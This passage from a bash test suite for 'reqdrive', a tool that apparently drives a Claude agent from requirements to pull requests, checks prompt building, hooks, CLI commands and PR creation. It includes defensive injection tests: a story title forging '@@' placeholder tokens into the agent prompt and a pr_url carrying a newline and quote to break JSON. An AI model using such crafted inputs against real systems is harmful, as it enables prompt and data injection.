  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  cat > "$TEST_TEMP/story-omits-passes.json" <<'PRDEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"A","acceptanceCriteria":["a"],"priority":1,"passes":true},
  {"id":"US-002","title":"B","acceptanceCriteria":["b"],"priority":2}
]}
PRDEOF

  result=$(select_next_story "$TEST_TEMP/story-omits-passes.json" 3)
  [ "$result" = "US-002" ]
)
test_result "story: select_next_story selects a story omitting passes" $?

echo ""
echo "--- Prompt Builders ---"

# Test: build_planning_prompt creates file containing requirement content
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  build_planning_prompt "$TEST_TEMP/plan-prompt.md" "This is the requirement content."
  [ -f "$TEST_TEMP/plan-prompt.md" ] &&
  grep -q "This is the requirement content" "$TEST_TEMP/plan-prompt.md"
)
test_result "prompt: build_planning_prompt includes requirement content" $?

# Test: build_planning_prompt includes PRD schema in output
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  build_planning_prompt "$TEST_TEMP/plan-prompt2.md" "Requirement."
  grep -q "PRD Schema" "$TEST_TEMP/plan-prompt2.md" &&
  grep -q "userStories" "$TEST_TEMP/plan-prompt2.md"
)
test_result "prompt: build_planning_prompt includes PRD schema" $?

# Test: build_planning_prompt uses quoted heredoc (safe)
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  # The planning prompt uses a quoted heredoc, so $HOME should NOT be expanded
  build_planning_prompt "$TEST_TEMP/plan-prompt3.md" "Check \$HOME variable"
  grep -q '\$HOME' "$TEST_TEMP/plan-prompt3.md"
)
test_result "prompt: build_planning_prompt preserves dollar signs in content" $?

# Test: implementation prompt matches the frozen golden file.
# CR is normalized on both sides: native Windows jq emits internal join("\n")
# as \r\n in text mode (see the tr -d '\r' note in oracle-gate.sh), so
# build_implementation_prompt's criteria list carries a CR on Windows and none
# on Linux. That line-ending artifact is not semantic; the golden is canonical
# LF and both sides are CR-stripped before the diff.
(
  set -e
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true
  out="$TEST_TEMP/golden-check.md"
  build_implementation_prompt "$out" "US-042" \
    "$(cat "$REQDRIVE_ROOT/tests/fixtures/golden-story.json")" \
    'Requirement body with & and $VAR'
  tr -d '\r' < "$REQDRIVE_ROOT/tests/fixtures/golden-impl-prompt.md" > "$TEST_TEMP/golden-norm.md"
  tr -d '\r' < "$out" > "$TEST_TEMP/golden-check-norm.md"
  diff -u "$TEST_TEMP/golden-norm.md" "$TEST_TEMP/golden-check-norm.md"
)
test_result "prompt: implementation prompt matches golden file" $?

# Test: dollar signs reach the agent without stray backslashes.
# sanitize_for_prompt escapes $ -> \$ for the old unquoted heredoc;
# build_implementation_prompt now reverses that escaping since the
# heredoc is quoted and the file is never re-evaluated by a shell.
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  prompt_file="$TEST_TEMP/prompt-dollar.md"
  story_json='{"title":"Fix $HOME handling","description":"d","acceptanceCriteria":["a"],"id":"US-9","priority":1,"passes":false}'
  sanitized_content="body"

  build_implementation_prompt "$prompt_file" "US-9" "$story_json" "$sanitized_content"

  # Positive: the title reaches the prompt verbatim.
  grep -q '\*\*Title:\*\* Fix \$HOME handling' "$prompt_file"
  if grep -q 'Fix \\$HOME' "$prompt_file"; then
    echo "unexpected: stray backslash before \$HOME" >&2
    exit 1
  fi
  # The commit message the agent is told to use must be clean too.
  grep -q 'feat: \[US-9\] - Fix \$HOME handling' "$prompt_file"
)
test_result "prompt: dollar signs reach the agent without stray backslashes" $?

# Test: shopt guard tolerates bash without patsub_replacement
(
  set -e
  out=$(bash -c 'set -e; shopt -u definitely_not_an_option 2>/dev/null || true; echo SURVIVED')
  [ "$out" = "SURVIVED" ] &&
  grep -q 'shopt -u patsub_replacement 2>/dev/null || true' "$REQDRIVE_ROOT/lib/run.sh"
)
test_result "prompt: shopt guard tolerates bash without patsub_replacement" $?

# Test: PRD content cannot forge a placeholder token
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  out="$TEST_TEMP/prompt-forge.md"
  story_json='{"title":"@@STORY_ID@@ and @@REQUIREMENT@@","description":"desc","acceptanceCriteria":["done"],"id":"US-004","priority":1,"passes":false}'
  build_implementation_prompt "$out" "US-004" "$story_json" "body text"

  if grep -q '@@' "$out"; then
    echo "unexpected: @@ token survived into rendered prompt" >&2
    exit 1
  fi
  grep -q "body text" "$out"
)
test_result "prompt: PRD content cannot forge a placeholder token" $?

# Test: ampersand in a title is not expanded to the match
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  out="$TEST_TEMP/prompt-amp.md"
  story_json='{"title":"auth & billing","description":"desc","acceptanceCriteria":["done"],"id":"US-005","priority":1,"passes":false}'
  build_implementation_prompt "$out" "US-005" "$story_json" "body text"

  grep -q '\*\*Title:\*\* auth & billing' "$out"
)
test_result "prompt: ampersand in a title is not expanded to the match" $?

echo ""
echo "--- Completion Hook ---"

# Test: run_completion_hook executes command with env vars
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  export REQDRIVE_COMPLETION_HOOK="echo \$REQ_ID \$STATUS \$PR_URL \$BRANCH \$EXIT_CODE > $TEST_TEMP/hook-out.txt"
  output=$(run_completion_hook "REQ-01" "completed" "https://pr.url" "reqdrive/req-01" "0" 2>/dev/null)
  grep -q "REQ-01" "$TEST_TEMP/hook-out.txt" &&
  grep -q "completed" "$TEST_TEMP/hook-out.txt" &&
  grep -q "https://pr.url" "$TEST_TEMP/hook-out.txt"
)
test_result "hook: executes command with env vars" $?

# Test: run_completion_hook is no-op when hook is empty
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  export REQDRIVE_COMPLETION_HOOK=""
  run_completion_hook "REQ-01" "completed" "" "" "0" 2>/dev/null
  # Should succeed silently
)
test_result "hook: no-op when hook is empty" $?

# Test: run_completion_hook handles failing hook gracefully
(
  set -e
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  export REQDRIVE_COMPLETION_HOOK="exit 42"
  # Should not propagate the failure (run.sh logs warning but continues)
  run_completion_hook "REQ-01" "failed" "" "" "5" 2>/dev/null
)
test_result "hook: handles failing hook gracefully" $?

echo ""
echo "--- CLI Commands ---"

# Test: status with no runs shows "No runs found"
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  mkdir -p docs/requirements
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" status 2>&1)
  echo "$output" | grep -q "No runs found"
)
test_result "cli: status with no runs shows 'No runs found'" $?

# Test: status with run.json shows status fields
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  mkdir -p docs/requirements
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  mkdir -p .reqdrive/runs/req-01
  cat > .reqdrive/runs/req-01/run.json <<'REOF'
{"status":"completed","pid":12345,"req_id":"REQ-01","started_at":"2026-01-01T00:00:00","updated_at":"2026-01-01T01:00:00","current_iteration":3,"exit_code":0,"pr_url":"https://github.com/test/pr/1"}
REOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" status 2>&1)
  echo "$output" | grep -q "REQ-01" &&
  echo "$output" | grep -q "completed"
)
test_result "cli: status with run.json shows status fields" $?

# Test: logs with missing log file shows error
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  mkdir -p docs/requirements
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" logs REQ-01 2>&1) || true
  echo "$output" | grep -q "No log file found"
)
test_result "cli: logs with missing log file shows error" $?

# Test: migrate adds version to versionless config
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  cat > reqdrive.json <<'EOF'
{"requirementsDir":"docs/requirements"}
EOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" migrate 2>&1)
  echo "$output" | grep -q "Updated: reqdrive.json" &&
  jq -r '.version' reqdrive.json | grep -q "0.3.0"
)
test_result "cli: migrate adds version to versionless config" $?

# Test: migrate skips config that already has version
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  cat > reqdrive.json <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
  output=$("$REQDRIVE_ROOT/bin/reqdrive" migrate 2>&1)
  echo "$output" | grep -q "Skipped: reqdrive.json"
)
test_result "cli: migrate skips config that already has version" $?

# Test: plan without args shows usage (requires claude)
if [ "$HAS_CLAUDE" = "true" ]; then
  (
    set -e
    cd "$TEST_TEMP"
    cat > reqdrive.json <<'EOF'
{"version":"0.3.0","requirementsDir":"docs/requirements"}
EOF
    output=$("$REQDRIVE_ROOT/bin/reqdrive" plan 2>&1) || true
    echo "$output" | grep -q "Usage: reqdrive plan"
  )
  test_result "cli: plan without args shows usage" $?
else
  test_skip "cli: plan without args shows usage" "claude not available"
fi

# Test: orchestrate shows "coming soon" stub
(
  set -e
  output=$("$REQDRIVE_ROOT/bin/reqdrive" orchestrate 2>&1)
  echo "$output" | grep -qi "coming soon"
)
test_result "cli: orchestrate shows 'coming soon'" $?

echo ""
echo "--- Preflight: Missing Coverage ---"

# Test: check_base_branch_exists passes when branch exists locally
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  git init -q
  git config user.email "test@test.com"
  git config user.name "Test"
  touch f.txt && git add f.txt && git commit -q -m "init"
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  check_base_branch_exists "$(git branch --show-current)" 2>/dev/null
)
test_result "preflight: check_base_branch_exists passes for local branch" $?

# Test: check_requirements_dir passes when dir exists with .md files
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/docs/requirements"
  echo "# REQ" > "$tmpdir/docs/requirements/REQ-01-test.md"
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  check_requirements_dir "$tmpdir/docs/requirements" 2>/dev/null
)
test_result "preflight: check_requirements_dir passes with .md files" $?

# Test: check_requirement_exists finds matching requirement file
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/docs/requirements"
  echo "# REQ" > "$tmpdir/docs/requirements/REQ-01-test-feature.md"
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  check_requirement_exists "REQ-01" "$tmpdir/docs/requirements" 2>/dev/null
)
test_result "preflight: check_requirement_exists finds matching file" $?

echo ""
echo "--- PR Creation ---"

# Test: create_pr outputs URL to stdout (captured by caller)
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  # Mock gh and git
  gh() {
    case "$1" in
      pr)
        case "$2" in
          create) echo "https://github.com/test/repo/pull/42" ;;
          view) echo "https://github.com/test/repo/pull/42" ;;
        esac
        ;;
    esac
    return 0
  }
  git() {
    case "$1" in
      push) return 0 ;;
      log) echo "abc1234 feat: test" ;;
    esac
  }
  export -f gh git

  source "$REQDRIVE_ROOT/lib/pr-create.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/.reqdrive/runs/req-01"
  export REQDRIVE_PR_LABELS=""

  output=$(create_pr "$tmpdir" "REQ-01" "reqdrive/req-01" "main" "" "$tmpdir/.reqdrive/runs/req-01" 2>/dev/null)
  echo "$output" | grep -q "https://github.com/test/repo/pull/42"
)
test_result "pr: create_pr outputs URL to stdout" $?

# Test: create_pr retries without labels when gh pr create fails with labels
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/.reqdrive/runs/req-01"

  # Use file-based counter (command substitution creates subshells that lose variable state)
  echo "0" > "$tmpdir/.attempt"
  gh() {
    case "$1" in
      pr)
        case "$2" in
          create)
            local attempt
            attempt=$(cat "$tmpdir/.attempt")
            attempt=$((attempt + 1))
            echo "$attempt" > "$tmpdir/.attempt"
            # Fail on first attempt (with labels), succeed on second (without)
            if [ "$attempt" -eq 1 ]; then
              return 1
            fi
            echo "https://github.com/test/repo/pull/99"
            return 0
            ;;
        esac
        ;;
    esac
    return 0
  }
  git() {
    case "$1" in
      push) return 0 ;;
      log) echo "abc1234 feat: test" ;;
    esac
  }
  export -f gh git

  source "$REQDRIVE_ROOT/lib/pr-create.sh"

  export REQDRIVE_PR_LABELS="nonexistent-label"

  output=$(create_pr "$tmpdir" "REQ-01" "reqdrive/req-01" "main" "" "$tmpdir/.reqdrive/runs/req-01" 2>/dev/null)
  echo "$output" | grep -q "https://github.com/test/repo/pull/99"
)
test_result "pr: create_pr retries without labels on failure" $?

# Test: create_pr returns non-zero when gh pr create fails without labels
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  gh() {
    case "$1" in
      pr)
        case "$2" in
          create) return 1 ;;
        esac
        ;;
    esac
    return 0
  }
  git() {
    case "$1" in
      push) return 0 ;;
      log) echo "abc1234 feat: test" ;;
    esac
  }
  export -f gh git

  source "$REQDRIVE_ROOT/lib/pr-create.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/.reqdrive/runs/req-01"
  export REQDRIVE_PR_LABELS=""

  # Should fail since no labels to retry without — use ! to invert for set -e
  ! create_pr "$tmpdir" "REQ-01" "reqdrive/req-01" "main" "" "$tmpdir/.reqdrive/runs/req-01" 2>/dev/null
)
test_result "pr: create_pr returns non-zero on gh failure without labels" $?

echo ""
echo "--- Init Verification ---"

# Test: init creates reqdrive.json with version 0.3.0
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  # Pipe answers to interactive prompts (4 read calls: req_dir, test_cmd, base_branch, project_name)
  printf '\n\n\n\n' | source "$REQDRIVE_ROOT/lib/init.sh" >/dev/null 2>&1
  [ -f "$tmpdir/reqdrive.json" ] &&
  jq -r '.version' "$tmpdir/reqdrive.json" | grep -q "0.3.0"
)
test_result "init: creates reqdrive.json with version 0.3.0" $?

# Test: init creates .reqdrive/runs/ directory
(
  set -e
  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  cd "$tmpdir"
  printf '\n\n\n\n' | source "$REQDRIVE_ROOT/lib/init.sh" >/dev/null 2>&1
  [ -d "$tmpdir/.reqdrive/runs" ]
)
test_result "init: creates .reqdrive/runs/ directory" $?

echo ""
echo "--- Run Summary & Verification ---"

# Test: write_run_status includes summary when RUN_SUMMARY_* vars are set
(
  set -e
  mkdir -p "$TEST_TEMP/run-summary1"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  RUN_SUMMARY_ITERATIONS=5
  RUN_SUMMARY_TESTS_PASSED=3
  RUN_SUMMARY_TESTS_FAILED=2
  RUN_SUMMARY_TESTS_SKIPPED=0
  RUN_SUMMARY_COMMITS_VERIFIED=4
  RUN_SUMMARY_COMMITS_MISSING=1
  RUN_SUMMARY_STORIES_COMPLETED=3
  RUN_SUMMARY_STORIES_FAILED=1
  RUN_SUMMARY_STORIES_TOTAL=5
  RUN_SUMMARY_VERIFICATION_PASSED=true

  write_run_status "$TEST_TEMP/run-summary1" "completed" "REQ-01" "5" "0"

  [ -f "$TEST_TEMP/run-summary1/run.json" ] &&
  [ "$(jq -r '.summary.iterations_run' "$TEST_TEMP/run-summary1/run.json")" = "5" ] &&
  [ "$(jq -r '.summary.tests_passed' "$TEST_TEMP/run-summary1/run.json")" = "3" ] &&
  [ "$(jq -r '.summary.tests_failed' "$TEST_TEMP/run-summary1/run.json")" = "2" ] &&
  [ "$(jq -r '.summary.commits_verified' "$TEST_TEMP/run-summary1/run.json")" = "4" ] &&
  [ "$(jq -r '.summary.commits_missing' "$TEST_TEMP/run-summary1/run.json")" = "1" ] &&
  [ "$(jq -r '.summary.stories_completed' "$TEST_TEMP/run-summary1/run.json")" = "3" ] &&
  [ "$(jq -r '.summary.stories_total' "$TEST_TEMP/run-summary1/run.json")" = "5" ] &&
  [ "$(jq -r '.summary.verification_passed' "$TEST_TEMP/run-summary1/run.json")" = "true" ]
)
test_result "run_status: includes summary when RUN_SUMMARY_* vars set" $?

# Test: write_run_status has null summary when accumulators not set
(
  set -e
  mkdir -p "$TEST_TEMP/run-summary2"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  unset RUN_SUMMARY_ITERATIONS
  write_run_status "$TEST_TEMP/run-summary2" "running" "REQ-01"

  [ -f "$TEST_TEMP/run-summary2/run.json" ] &&
  [ "$(jq -r '.summary' "$TEST_TEMP/run-summary2/run.json")" = "null" ]
)
test_result "run_status: summary is null when accumulators not set" $?

# Test: write_run_status summary is valid JSON
(
  set -e
  mkdir -p "$TEST_TEMP/run-summary3"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  RUN_SUMMARY_ITERATIONS=2
  RUN_SUMMARY_TESTS_PASSED=1
  RUN_SUMMARY_TESTS_FAILED=1
  RUN_SUMMARY_TESTS_SKIPPED=0
  RUN_SUMMARY_COMMITS_VERIFIED=2
  RUN_SUMMARY_COMMITS_MISSING=0
  RUN_SUMMARY_STORIES_COMPLETED=2
  RUN_SUMMARY_STORIES_FAILED=0
  RUN_SUMMARY_STORIES_TOTAL=2
  RUN_SUMMARY_VERIFICATION_PASSED=false

  write_run_status "$TEST_TEMP/run-summary3" "completed" "REQ-01" "2" "0"
  jq empty "$TEST_TEMP/run-summary3/run.json"
)
test_result "run_status: run.json with summary is valid JSON" $?

# Test: write_run_status JSON-escapes pr_url (F8 root cause fix) — a pr_url
# containing a newline and a double-quote must not break run.json's JSON.
(
  set -e
  mkdir -p "$TEST_TEMP/run-pr-escape"
  export REQDRIVE_ROOT
  source "$REQDRIVE_ROOT/lib/errors.sh"
  source "$REQDRIVE_ROOT/lib/sanitize.sh"
  source "$REQDRIVE_ROOT/lib/preflight.sh"
  source "$REQDRIVE_ROOT/lib/schema.sh"
  source "$REQDRIVE_ROOT/lib/run.sh" 2>/dev/null || true

  weird_url=$'https://x/pull/1\n"evil'
  write_run_status "$TEST_TEMP/run-pr-escape" "completed" "REQ-01" "1" "0" "$weird_url"

  jq -e . "$TEST_TEMP/run-pr-escape/run.json" > /dev/null

  # tr -d '\r': on Windows, jq's own -r output translates an embedded LF to
  # CRLF when piped through git-bash; strip it symmetrically so this checks
  # content round-tripping, not that platform artifact.
  round_tripped=$(jq -r '.pr_url' "$TEST_TEMP/run-pr-escape/run.json" | tr -d '\r')
  expected=$(printf '%s' "$weird_url" | tr -d '\r')
  [ "$round_tripped" = "$expected" ]
)
test_result "run_status: pr_url with special chars stays valid JSON" $?

# Test: PR body includes verification section when verification-summary.json exists
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  gh() {
    case "$1" in
      pr)
        case "$2" in
          create) echo "https://github.com/test/repo/pull/50" ;;
          view) echo "https://github.com/test/repo/pull/50" ;;
        esac
        ;;
    esac
    return 0
  }
  git() {
    case "$1" in
      push) return 0 ;;
      log) echo "abc1234 feat: test" ;;
    esac
  }
  export -f gh git

  source "$REQDRIVE_ROOT/lib/pr-create.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/.reqdrive/runs/req-01"

  # Create a verification summary
  cat > "$tmpdir/.reqdrive/runs/req-01/verification-summary.json" <<'VSEOF'
{
  "version": "0.3.0",
  "req_id": "REQ-01",
  "stories": {"total": 3, "completed": 2, "failed": 1, "remaining": 1},
  "iterations": {"run": 5, "max": 10},
  "tests": {"passed": 4, "failed": 1, "skipped": 0},
  "commits": {"verified": 4, "missing": 1},
  "verification_passed": false
}
VSEOF

  # Create a PRD for the checklist
  cat > "$tmpdir/.reqdrive/runs/req-01/prd.json" <<'PEOF'
{"version":"0.3.0","project":"Test","sourceReq":"REQ-01","userStories":[
  {"id":"US-001","title":"Story A","acceptanceCriteria":["AC1"],"priority":1,"passes":true}
]}
PEOF

  export REQDRIVE_PR_LABELS=""

  # Capture stderr (PR body is passed to gh, which we mock — we need to inspect args)
  # Instead, override gh to capture the body
  gh() {
    case "$1" in
      pr)
        case "$2" in
          create)
            # Find --body arg
            while [ $# -gt 0 ]; do
              if [ "$1" = "--body" ]; then
                echo "$2" > "$tmpdir/.pr-body"
                break
              fi
              shift
            done
            echo "https://github.com/test/repo/pull/50"
            return 0
            ;;
          view) echo "https://github.com/test/repo/pull/50" ;;
        esac
        ;;
    esac
    return 0
  }
  export -f gh

  create_pr "$tmpdir" "REQ-01" "reqdrive/req-01" "main" "" "$tmpdir/.reqdrive/runs/req-01" 2>/dev/null

  [ -f "$tmpdir/.pr-body" ] &&
  grep -q "Pipeline Verification" "$tmpdir/.pr-body" &&
  grep -q "2 / 3 completed" "$tmpdir/.pr-body" &&
  grep -q "5 / 10 used" "$tmpdir/.pr-body"
)
test_result "pr: body includes verification section from summary" $?

# Test: PR body has no verification section when no summary file
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/.reqdrive/runs/req-01"

  gh() {
    case "$1" in
      pr)
        case "$2" in
          create)
            while [ $# -gt 0 ]; do
              if [ "$1" = "--body" ]; then
                echo "$2" > "$tmpdir/.pr-body2"
                break
              fi
              shift
            done
            echo "https://github.com/test/repo/pull/51"
            return 0
            ;;
          view) echo "https://github.com/test/repo/pull/51" ;;
        esac
        ;;
    esac
    return 0
  }
  git() {
    case "$1" in
      push) return 0 ;;
      log) echo "abc1234 feat: test" ;;
    esac
  }
  export -f gh git

  source "$REQDRIVE_ROOT/lib/pr-create.sh"
  export REQDRIVE_PR_LABELS=""

  create_pr "$tmpdir" "REQ-01" "reqdrive/req-01" "main" "" "$tmpdir/.reqdrive/runs/req-01" 2>/dev/null

  [ -f "$tmpdir/.pr-body2" ] &&
  ! grep -q "Pipeline Verification" "$tmpdir/.pr-body2"
)
test_result "pr: body omits verification section when no summary file" $?

echo ""
echo "--- Review Phase ---"

# Test: config defaults reviewCommand to empty string
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_REVIEW_COMMAND" = "" ]
)
test_result "review: config defaults reviewCommand to empty string" $?

# Test: config reads reviewCommand from JSON
(
  set -e
  cd "$TEST_TEMP"
  cat > reqdrive.json <<'EOF'
{"reviewCommand": "builtin"}
EOF
  source "$REQDRIVE_ROOT/lib/config.sh"
  reqdrive_load_config
  [ "$REQDRIVE_REVIEW_COMMAND" = "builtin" ]
)
test_result "review: config reads reviewCommand from JSON" $?

# Test: schema accepts string reviewCommand
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"reviewCommand": "builtin"}' > "$TEST_TEMP/review-str.json"
  validate_config_schema "$TEST_TEMP/review-str.json" 2>/dev/null
)
test_result "review: schema accepts string reviewCommand" $?

# Test: schema rejects non-string reviewCommand
(
  set -e
  source "$REQDRIVE_ROOT/lib/schema.sh"
  echo '{"reviewCommand": 123}' > "$TEST_TEMP/review-bad.json"
  output=$(validate_config_schema "$TEST_TEMP/review-bad.json" 2>&1) && exit 1
  echo "$output" | grep -q "reviewCommand must be a string"
)
test_result "review: schema rejects non-string reviewCommand" $?

# Test: update_pr_with_review formats findings into PR body
(
  set -e
  source "$REQDRIVE_ROOT/lib/sanitize.sh"

  tmpdir=$(mktemp -d)
  trap "rm -rf $tmpdir" EXIT
  mkdir -p "$tmpdir/agent"

  # Create findings file
  cat > "$tmpdir/agent/review-findings.json" <<'EOF'
[
  {"severity": "warning", "file": "lib/run.sh", "message": "Missing null check"},
  {"severity": "info", "file": "lib/config.sh", "message": "Consider adding validation"}
]
EOF

  # Mock gh
  gh() {
    case "$1" in
      pr)
        case "$2" in
          view) echo "Existing PR body" ;;
          edit)
            # Capture the body argument
            shift 2
            while [ $# -gt 0 ]; do
              case "$1" in
                --body) echo "$2" > "$tmpdir/.updated-body"; shift ;;
              esac
              shift
            done
            return 0
            ;;
        esac
        ;;
    esac
    return 0
  }
  export -f gh

  source "$REQDRIVE_ROOT/lib/pr-create.sh"

  update_pr_with_review "https://github.com/test/repo/pull/42" "$tmpdir/agent" 2>/dev/null

  [ -f "$tmpdir/.updated-body" ] &&
  grep -q "Code Review Findings" "$tmpdir/.updated-body" &&
  grep -q "Missing null check" "$tmpdir/.updated-body" &&
  grep -q "warning" "$tmpdir/.updated-body"
)
test_result "review: update_pr_with_review formats findings correctly" $?

echo ""
echo "--- Pipeline Harness ---"

# Test: a scripted run reaches PR creation
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/ph-e2e"
  ph_fake_claude full
  ph_fake_gh
  rc=$(ph_run REQ-01)
  [ "$rc" = "0" ]
  ph_gh_args | grep -q "pr create"
)
test_result "pipeline: scripted run reaches PR creation" $?

# Test: verification-summary.json is unchanged by the Phase 3 extraction
# into lib/verification.sh (characterization test — the extraction did not
# change the output).
(
  set -e
  source "$REQDRIVE_ROOT/tests/lib/pipeline-harness.sh"
  ph_setup "$TEST_TEMP/vx"
  ph_fake_claude full
  ph_fake_gh
  ph_run REQ-01 > /dev/null
  s="$PH_ROOT/.reqdrive/runs/req-01/verification-summary.json"
  jq -e '.version == "0.3.0"' "$s" > /dev/null
